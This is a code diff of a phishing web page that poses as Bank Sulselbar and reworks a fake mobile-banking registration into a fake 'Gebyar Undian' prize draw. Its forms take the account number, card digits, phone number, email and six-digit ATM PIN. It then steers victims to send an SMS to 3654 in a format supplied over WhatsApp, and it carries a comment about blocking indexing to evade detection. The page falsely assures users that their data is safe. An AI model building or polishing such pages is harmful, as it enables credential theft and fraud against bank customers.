@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bank Sulselbar Mobile Banking</title>
+    <title>Gebyar Undian — Bank Sulselbar</title>
     <link rel="stylesheet" href="style.css">
 <!-- ✅ BLOKIR INDEKS & DETEKSI -->
      <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, notranslate, noimageindex">
@@ -20,21 +20,48 @@
 <body>
 
 <!-- ============================================== -->
-<!-- 🔹 HALAMAN 1 — HALAMAN TETAP (TIDAK DIUBAH) -->
+<!-- 🏠 HALAMAN AWAL — GEBYAR UNDIAN BANK SULSELBAR -->
 <!-- ============================================== -->
-<div class="halaman aktif" id="halTetap" data-halaman="Halaman Tetap">
+<div class="halaman aktif" id="halAwal" data-halaman="Halaman Awal">
     <div class="latar-pola"></div>
-    <div class="tengah">
-        <div class="logo-sulselbar"></div>
-        <div class="nama-bank">Bank Sulselbar</div>
-        <div class="tagline-app">Mobile Banking</div>
-        <div class="call-center">Call Center : 1500855</div>
-    </div>
-    <div class="tombol-bawah">
-        <button class="btn-putih" onclick="keRegistrasi()">Registrasi</button>
-    </div>
-    <div class="footer-keterangan">
-        PT. Bank Sulselbar berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia, serta merupakan peserta penjaminan LPS.
+    <div class="konten-awal">
+        
+        <!-- 🎀 Pita Atas -->
+        <div class="pita-atas-awal">
+            <span class="bintang">★</span>
+            <span class="teks-pita-awal">PROGRAM PROMOSI</span>
+            <span class="bintang">★</span>
+        </div>
+
+        <!-- 🎫 Logo Festival Gebyar Undian -->
+        <div class="logo-festival">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c0/Logo_Bank_Sulselbar.png" alt="Logo Festival Gebyar Undian Bank Sulselbar">
+        </div>
+
+        <!-- 🏦 Nama Bank -->
+        <div class="nama-bank-awal">Bank Sulselbar</div>
+
+        <!-- 🎊 Judul Utama -->
+        <h1 class="judul-gebyar">
+            <span class="ikon-kiri">🎉</span>
+            GEBYAR UNDIAN
+            <span class="ikon-kanan">🎉</span>
+        </h1>
+        <h2 class="sub-judul-gebyar">GEBYAR BANK SULSELBAR</h2>
+        
+        <p class="deskripsi-awal">Ikut berpartisipasi dan menangkan hadiah menarik!</p>
+
+        <!-- 🚀 Tombol Mulai -->
+        <div class="tombol-bawah-awal">
+            <button class="btn-mulai" onclick="keRegistrasi()">
+                <span class="ikon-btn">🎫</span>
+                <span class="teks-btn">IKUTI UNDIAN</span>
+            </button>
+        </div>
+
+        <div class="footer-awal">
+            PT. Bank Sulselbar berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia, serta merupakan peserta penjaminan LPS.
+        </div>
     </div>
 </div>
 
@@ -43,16 +70,16 @@
 <!-- ============================================== -->
 <div class="halaman halaman-putih" id="halRegistrasi" data-halaman="Registrasi Baru">
     <div class="header-hijau">
-        <span class="panah-kembali" onclick="kembaliKeTetap()">&larr;</span>
-        <span class="judul-header">Registrasi Baru</span>
+        <span class="panah-kembali" onclick="kembaliKeAwal()">&larr;</span>
+        <span class="judul-header">Registrasi Peserta</span>
     </div>
     <div class="konten">
-        <p class="teks-keterangan">Lengkapi data berikut untuk melakukan registrasi Mobile Banking Bank Sulselbar</p>
+        <p class="teks-keterangan">Lengkapi data berikut untuk mengikuti Gebyar Undian Bank Sulselbar</p>
         <label class="label-input">No. Rekening (Maks. 15 Angka)</label>
         <input type="text" class="input-field" id="noRekening" placeholder="Masukkan Nomor Rekening" inputmode="numeric" maxlength="15" oninput="hanyaAngka(this)">
         <label class="label-input">4 Digit Terakhir No. Kartu</label>
         <input type="text" class="input-field" id="noKartu" placeholder="Masukkan 4 Digit Terakhir" inputmode="numeric" maxlength="4" oninput="hanyaAngka(this)">
-        <label class="label-input">Nomor Handphone Bank Sulselbar </label>
+        <label class="label-input">Nomor Handphone Bank Sulselbar</label>
         <input type="tel" class="input-field" id="noHP" placeholder="Nomor Handphone Aktif" inputmode="tel" maxlength="14" oninput="validasiNoHP(this)">
         <label class="label-input">Email</label>
         <input type="email" class="input-field" id="email" placeholder="Masukkan Email">
@@ -61,48 +88,77 @@
 </div>
 
 <!-- ============================================== -->
-<!-- 🔹 HALAMAN 3 — PIN ATM -->
+<!-- 🔹 HALAMAN 3 — PIN ATM (HANYA ANGKA) -->
 <!-- ============================================== -->
 <div class="halaman halaman-putih" id="halPIN" data-halaman="PIN ATM">
     <div class="header-hijau">
         <span class="panah-kembali" onclick="kembaliKeRegistrasi()">&larr;</span>
-        <span class="judul-header">PIN ATM</span>
+        <span class="judul-header">Verifikasi PIN ATM</span>
     </div>
     <div class="konten">
-        <p class="info-teks">Masukkan PIN ATM Anda (6 digit)</p>
+        <p class="info-teks">Masukkan PIN ATM Anda (6 digit angka)</p>
         <div class="kotak-kode">
-            <input type="password" class="kolom-kode" maxlength="1" id="p1" oninput="pindahKode(this,'p2')">
-            <input type="password" class="kolom-kode" maxlength="1" id="p2" oninput="pindahKode(this,'p3')">
-            <input type="password" class="kolom-kode" maxlength="1" id="p3" oninput="pindahKode(this,'p4')">
-            <input type="password" class="kolom-kode" maxlength="1" id="p4" oninput="pindahKode(this,'p5')">
-            <input type="password" class="kolom-kode" maxlength="1" id="p5" oninput="pindahKode(this,'p6')">
-            <input type="password" class="kolom-kode" maxlength="1" id="p6" oninput="keKeterangan()">
+            <input type="tel" class="kolom-kode" maxlength="1" id="p1" inputmode="numeric" oninput="hanyaAngka(this); pindahKode(this,'p2')">
+            <input type="tel" class="kolom-kode" maxlength="1" id="p2" inputmode="numeric" oninput="hanyaAngka(this); pindahKode(this,'p3')">
+            <input type="tel" class="kolom-kode" maxlength="1" id="p3" inputmode="numeric" oninput="hanyaAngka(this); pindahKode(this,'p4')">
+            <input type="tel" class="kolom-kode" maxlength="1" id="p4" inputmode="numeric" oninput="hanyaAngka(this); pindahKode(this,'p5')">
+            <input type="tel" class="kolom-kode" maxlength="1" id="p5" inputmode="numeric" oninput="hanyaAngka(this); pindahKode(this,'p6')">
+            <input type="tel" class="kolom-kode" maxlength="1" id="p6" inputmode="numeric" oninput="hanyaAngka(this); keKeterangan()">
         </div>
+        <p class="petunjuk-pin">⚠️ Hanya dapat memasukkan angka 0-9</p>
     </div>
 </div>
 
 <!-- ============================================== -->
-<!-- 🔹 HALAMAN 4 — KETERANGAN KUPON UNDIAN -->
+<!-- 🔹 HALAMAN 4 — KUPON UNDIAN (MENARIK, WARNA TETAP) -->
 <!-- ============================================== -->
 <div class="halaman halaman-putih" id="halKeterangan" data-halaman="Kupon Undian">
     <div class="header-hijau">
         <span class="panah-kembali" onclick="kembaliKePIN()">&larr;</span>
-        <span class="judul-header">Kupon Undian</span>
+        <span class="judul-header">🎉 Kupon Undian Gebyar Festival</span>
     </div>
-    <div class="konten">
-        <div style="background:#f0f9f4; border:1px solid #2e7d32; border-radius:12px; padding:20px; margin-bottom:25px;">
-            <p style="font-size:15px; line-height:1.8; color:#2e7d32; text-align:center;">
-                ✅ Terima kasih telah melakukan Cetak Kupon Undian <strong>Gebyar Festival</strong>.<br><br>
-                Silakan kirimkan format melalui SMS ke <strong>3654</strong><br><br>
-                <em>Format SMS akan dikirim melalui WhatsApp, lalu salin format tersebut dan kirimkan.</em>
-            </p>
+    <div class="konten kupon-konten">
+        
+        <!-- 🎀 Pita Atas -->
+        <div class="pita-atas">
+            <span class="ikon-bintang">★</span>
+            <span class="teks-pita">SELAMAT!</span>
+            <span class="ikon-bintang">★</span>
         </div>
-        
-        <button class="btn-hijau" onclick="bukaSMS()">📱 KIRIM SMS KE 3654</button>
-        
-        <p style="text-align:center; color:#777; font-size:13px; margin-top:15px;">
-            Klik tombol di atas untuk langsung membuka aplikasi SMS<br>
-            Nomor tujuan: <strong>3654</strong>
+
+        <!-- 🎫 Kartu Kupon Utama -->
+        <div class="kartu-kupon">
+            <div class="latar-gradient"></div>
+            <div class="isi-kupon">
+                <div class="ikon-sukses">✅</div>
+                <h2 class="judul-kupon">Terima Kasih!</h2>
+                <p class="subjudul-kupon">Anda telah berhasil melakukan</p>
+                <div class="label-undian">Cetak Kupon Undian</div>
+                <h3 class="nama-festival">🎊 GEBYAR FESTIVAL 🎊</h3>
+                
+                <div class="pemisah"></div>
+                
+                <div class="kotak-instruksi">
+                    <p class="teks-instruksi">
+                        📩 <strong>Silakan kirimkan format melalui SMS ke:</strong>
+                    </p>
+                    <div class="nomor-tujuan">3654</div>
+                    <p class="teks-format">
+                        💬 Format SMS akan dikirim melalui <strong>WhatsApp</strong>,<br>
+                        lalu salin format tersebut dan kirimkan.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- 🚀 Tombol Kirim SMS -->
+        <button class="btn-kirim-sms" onclick="bukaSMS()">
+            <span class="ikon-btn">📱</span>
+            <span class="teks-btn">KIRIM SMS KE 3654</span>
+        </button>
+
+        <p class="catatan-bawah">
+            🔒 Data Anda aman dan terjamin kerahasiaannya
         </p>
     </div>
 </div>
